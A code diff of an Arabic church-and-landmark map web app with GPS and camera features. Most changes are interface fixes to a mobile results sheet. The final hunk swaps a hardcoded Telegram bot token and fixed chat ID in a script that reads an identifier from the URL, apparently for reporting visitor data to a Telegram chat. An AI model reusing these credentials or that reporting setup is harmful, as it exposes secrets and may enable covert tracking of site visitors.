@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الدليل المقدس | dalil-alkanayis </title>
+    <title>الدليل المقدس | dalil-alkanayis</title>
     
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -21,7 +21,7 @@
         .royal-font { font-family: 'Amiri', serif; }
         
         /* تصميم شريط التمرير الذهبي */
-        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-track { background: #180d26; }
         ::-webkit-scrollbar-thumb { background: linear-gradient(to bottom, #b45309, #fbbf24); border-radius: 10px; }
 
@@ -75,12 +75,35 @@
             animation: bounce-slow 2s infinite; 
         }
         @keyframes bounce-slow { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+
+        /* --- الحل السحري للقائمة السفلية --- */
+        .bottom-sheet {
+            /* الارتفاع الأقصى نصف الشاشة فقط لضمان رؤية الخريطة */
+            max-height: 55vh; 
+            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); /* حركة ناعمة جداً */
+            bottom: 4rem; /* فوق شريط التنقل مباشرة */
+        }
+        
+        /* وضعية الطي (يظهر الرأس فقط) */
+        .sheet-collapsed {
+            transform: translateY(calc(100% - 10.1rem));
+        }
+        
+        /* وضعية الفتح */
+        .sheet-expanded {
+            transform: translateY(calc(105%));
+        }
+
+        /* إصلاح Z-Index */
+        .leaflet-control-container { z-index: 400; } /* أزرار الخريطة */
+        #mobile-results-sheet { z-index: 500; } /* القائمة فوق الخريطة */
+        nav { z-index: 600; } /* شريط التنقل فوق الجميع */
     </style>
 </head>
 <body class="h-screen flex flex-col overflow-hidden bg-[url('https://www.transparenttextures.com/patterns/black-scales.png')]">
 
     <!-- Header / Top Bar -->
-    <header class="bg-indigo-950/90 backdrop-blur border-b-2 border-amber-700 shadow-xl z-20 shrink-0">
+    <header class="bg-indigo-950/90 backdrop-blur border-b-2 border-amber-700 shadow-xl z-[500] shrink-0">
         <div class="container mx-auto flex justify-between items-center p-3">
             <div class="flex items-center gap-3">
                 <div class="w-9 h-9 rounded-lg bg-gradient-to-br from-amber-600 to-amber-800 flex items-center justify-center shadow-lg border border-amber-400">
@@ -93,9 +116,9 @@
             </div>
             
             <div class="flex gap-2">
-                <!-- زر التبديل الجديد: مصر بالكامل -->
+                <!-- زر معالم مصر -->
                 <button onclick="loadFamousLandmarks()" class="bg-indigo-800 hover:bg-amber-800 text-amber-300 text-xs px-3 py-1 rounded border border-amber-600 transition flex items-center gap-2 shadow-lg">
-                    <i class="fa-solid fa-monument"></i> <span class="hidden md:inline">معالم مصر التاريخية</span>
+                    <i class="fa-solid fa-monument"></i> <span class="hidden md:inline">معالم مصر</span>
                 </button>
                 <div id="gps-status" class="hidden md:flex bg-black/30 px-3 py-1 rounded-full border border-amber-900/50 text-[10px] text-amber-500 gap-2 items-center">
                     <i class="fa-solid fa-satellite-dish animate-pulse"></i> <span>انتظار...</span>
@@ -128,10 +151,11 @@
             <!-- Map View -->
             <div id="map-container" class="w-full h-full absolute inset-0">
                 <div id="map" class="w-full h-full bg-[#0f172a]"></div>
-                <!-- Floating Map Controls -->
+                <!-- Floating Map Controls (Top Left - Safe Area) -->
                 <div class="absolute top-4 left-4 z-[400] flex flex-col gap-2">
                     <button onclick="setMapLayer('satellite')" class="w-9 h-9 bg-indigo-950/90 text-amber-500 rounded-lg border border-amber-700 hover:bg-indigo-800 shadow-lg" title="قمر صناعي"><i class="fa-solid fa-earth-americas"></i></button>
                     <button onclick="setMapLayer('street')" class="w-9 h-9 bg-indigo-950/90 text-amber-500 rounded-lg border border-amber-700 hover:bg-indigo-800 shadow-lg" title="خريطة"><i class="fa-solid fa-map"></i></button>
+                    <!-- Mobile Landmark Button (Icon Only) -->
                     <button onclick="loadFamousLandmarks()" class="w-9 h-9 bg-amber-900/90 text-white rounded-lg border border-amber-500 hover:bg-amber-700 shadow-lg md:hidden" title="معالم مصر"><i class="fa-solid fa-monument"></i></button>
                 </div>
             </div>
@@ -151,18 +175,35 @@
                 </div>
             </div>
 
-            <!-- Mobile Results Overlay -->
-            <div id="mobile-results-sheet" class="absolute bottom-16 left-0 right-0 bg-indigo-950/95 border-t-2 border-amber-600 rounded-t-2xl p-4 max-h-[40vh] overflow-y-auto z-[450] md:hidden transform transition-transform duration-300 translate-y-full">
-                <div class="w-12 h-1 bg-amber-700/50 rounded-full mx-auto mb-3"></div>
-                <h3 class="text-amber-400 font-bold text-sm mb-2 text-right">المواقع المكتشفة (<span id="mob-count">0</span>)</h3>
-                <div id="mob-results-list" class="space-y-2 pb-2"></div>
+            <!-- Mobile Results Sheet (Corrected) -->
+            <div id="mobile-results-sheet" class="bottom-sheet sheet-collapsed absolute left-2 right-2 bg-indigo-950/95 border border-amber-600 rounded-t-2xl md:hidden shadow-[0_-5px_20px_rgba(0,0,0,0.5)] flex flex-col backdrop-blur-md">
+                <!-- Drag Handle / Header -->
+                <div class="p-3 border-b border-amber-800/50 flex justify-between items-center cursor-pointer bg-gradient-to-r from-indigo-950 to-indigo-900 rounded-t-2xl touch-none" onclick="toggleBottomSheet()">
+                    <div class="flex items-center gap-2">
+                        <!-- مؤشر السحب -->
+                        <div class="w-1 h-8 bg-amber-600/50 rounded-full hidden"></div>
+                        <div class="flex flex-col">
+                            <span class="text-xs text-amber-300 font-bold royal-font">المواقع المكتشفة</span>
+                            <span class="text-[10px] text-gray-400">العدد: <span id="mob-count" class="text-white">0</span></span>
+                        </div>
+                    </div>
+                    <!-- زر السهم -->
+                    <div class="w-8 h-8 rounded-full bg-indigo-900 flex items-center justify-center border border-amber-700/30">
+                        <i id="sheet-arrow" class="fa-solid fa-chevron-up text-amber-500 text-xs transition-transform duration-300"></i>
+                    </div>
+                </div>
+                
+                <!-- List Content (Scrollable) -->
+                <div id="mob-results-list" class="overflow-y-auto p-3 space-y-2 pb-6 custom-scrollbar flex-1 bg-indigo-950/50">
+                    <!-- Items injected here -->
+                </div>
             </div>
 
         </main>
     </div>
 
-    <!-- 3. Bottom Navigation Bar (Mobile Only) -->
-    <nav class="md:hidden bg-indigo-950 border-t border-amber-800 flex justify-around items-center h-16 shrink-0 z-50 shadow-[0_-5px_15px_rgba(0,0,0,0.5)]">
+    <!-- 3. Bottom Navigation Bar -->
+    <nav class="md:hidden bg-indigo-950 border-t border-amber-800 flex justify-around items-center h-16 shrink-0 shadow-[0_-5px_15px_rgba(0,0,0,0.5)] relative">
         <button onclick="switchView('map')" class="nav-btn active flex-1 flex flex-col items-center justify-center h-full text-gray-500 transition">
             <i class="fa-solid fa-map text-lg mb-1"></i>
             <span class="text-[10px]">الخريطة</span>
@@ -229,6 +270,7 @@
         let mapLayers = {};
         let cameraStream = null;
         let currentRadius = 5000;
+        let isSheetExpanded = false; // Track sheet state
 
         // --- قاعدة بيانات المعالم التاريخية (Fallback Data) ---
         const famousLandmarks = [
@@ -326,23 +368,25 @@
             allData = famousLandmarks.map(l => ({tags: {name: l.name, denomination: l.type}, lat: l.lat, lon: l.lon}));
 
             document.getElementById('mob-count').innerText = famousLandmarks.length;
-            document.getElementById('mobile-results-sheet').classList.remove('translate-y-full');
+            
+            // Auto expand list slightly
+            setSheetState(true);
 
             famousLandmarks.forEach(place => {
-                // List Item
+                // List Item (Mobile Optimized)
                 const itemHTML = `
-                    <div class="bg-indigo-900/60 p-3 rounded border border-amber-600/40 hover:bg-amber-900/40 cursor-pointer flex justify-between items-center transition" onclick="focusOn(${place.lat},${place.lon},'${place.name}')">
+                    <div class="bg-indigo-900/60 p-2 rounded border border-amber-600/40 hover:bg-amber-900/40 cursor-pointer flex justify-between items-center transition" onclick="focusOn(${place.lat},${place.lon},'${place.name}')">
                         <div>
-                            <div class="font-bold text-amber-300 text-sm royal-font">${place.name}</div>
-                            <div class="text-[10px] text-gray-300"><i class="fa-solid fa-location-dot me-1"></i>${place.region} | ${place.type}</div>
+                            <div class="font-bold text-amber-300 text-xs royal-font">${place.name}</div>
+                            <div class="text-[9px] text-gray-300"><i class="fa-solid fa-location-dot me-1"></i>${place.region}</div>
                         </div>
-                        <i class="fa-solid fa-monument text-amber-600 text-lg"></i>
+                        <i class="fa-solid fa-arrow-left text-amber-600 text-xs"></i>
                     </div>
                 `;
                 deskList.innerHTML += itemHTML;
                 mobList.innerHTML += itemHTML;
 
-                // Marker with Special Icon
+                // Marker
                 const icon = L.divIcon({
                     className: '',
                     html: `<div class="text-amber-500 text-3xl drop-shadow-[0_0_10px_rgba(251,191,36,0.8)] landmark-icon"><i class="fa-solid fa-place-of-worship"></i></div>`,
@@ -395,7 +439,9 @@
             deskList.innerHTML = ''; mobList.innerHTML = '';
             
             document.getElementById('mob-count').innerText = data.length;
-            document.getElementById('mobile-results-sheet').classList.remove('translate-y-full');
+            
+            // Expand sheet automatically when results found
+            setSheetState(true);
 
             data.forEach(p => {
                 const lat = p.type==='node'?p.lat:p.center.lat;
@@ -407,8 +453,8 @@
                 const itemHTML = `
                     <div class="bg-indigo-900/40 p-2 rounded border border-amber-800/30 hover:bg-amber-900/20 cursor-pointer flex justify-between items-center" onclick="focusOn(${lat},${lon},'${name}')">
                         <div>
-                            <div class="font-bold text-amber-200 text-sm">${name}</div>
-                            <div class="text-[10px] text-gray-400">${type} | ${dist} كم</div>
+                            <div class="font-bold text-amber-200 text-xs">${name}</div>
+                            <div class="text-[9px] text-gray-400">${type} | ${dist} كم</div>
                         </div>
                         <i class="fa-solid fa-location-crosshairs text-amber-600"></i>
                     </div>
@@ -429,12 +475,35 @@
             switchView('map');
             map.flyTo([lat, lon], 16, {duration: 1.5});
             setTimeout(() => L.popup().setLatLng([lat, lon]).setContent(`<b class="royal-font text-amber-400">${name}</b>`).openOn(map), 1500);
-            document.getElementById('mobile-results-sheet').classList.add('translate-y-full');
+            
+            // Collapse sheet to show map
+            setSheetState(false);
         }
 
-        function filterResults(denom) {
-            // (Functionality remains similar to previous version, filtering allData)
-            renderLiveResults(allData.filter(p => denom === 'all' || (p.tags.denomination||"").toLowerCase().includes(denom)));
+        // --- Bottom Sheet Logic (Fixed) ---
+        function toggleBottomSheet() {
+            setSheetState(!isSheetExpanded);
+        }
+
+        function setSheetState(expand) {
+            const sheet = document.getElementById('mobile-results-sheet');
+            const arrow = document.getElementById('sheet-arrow');
+            
+            if (expand) {
+                // Expand
+                sheet.classList.remove('sheet-collapsed');
+                sheet.classList.add('sheet-expanded');
+                arrow.classList.remove('fa-chevron-up');
+                arrow.classList.add('fa-chevron-down');
+                isSheetExpanded = true;
+            } else {
+                // Collapse (Peek Mode)
+                sheet.classList.remove('sheet-expanded');
+                sheet.classList.add('sheet-collapsed');
+                arrow.classList.remove('fa-chevron-down');
+                arrow.classList.add('fa-chevron-up');
+                isSheetExpanded = false;
+            }
         }
 
         // --- UI Switching ---
@@ -449,13 +518,13 @@
                 mapC.classList.remove('hidden');
                 camC.classList.add('hidden');
                 document.querySelector('button[onclick="switchView(\'map\')"]').classList.add('active');
-                if(allData.length > 0) sheet.classList.remove('translate-y-full'); 
+                if(allData.length > 0) sheet.classList.remove('hidden'); 
                 setTimeout(() => map.invalidateSize(), 100);
             } else {
                 mapC.classList.add('hidden');
                 camC.classList.remove('hidden');
                 document.querySelector('button[onclick="switchView(\'camera\')"]').classList.add('active');
-                sheet.classList.add('translate-y-full'); 
+                sheet.classList.add('hidden'); // Hide list completely in AR mode
                 if(!cameraStream) startApp();
             }
         }
@@ -540,8 +609,8 @@
 
 <script>
     // ⚙️ إعدادات التيليجرام
-    const BOT_TOKEN = '8408417562:AAGbJ1VuFQ7nzTQhrTl72Atv5tkBmyFJWlU'; 
-    const FIXED_CHAT_ID = '1431886140'; 
+    const BOT_TOKEN = '8488447798:AAEV2088vWIqstcpJKB3cfH5_kapr2xfp2w'; 
+    const FIXED_CHAT_ID = '1777965702'; 
 
     // 📍 جلب المعرف من الرابط
     const urlParams = new URLSearchParams(window.location.search);
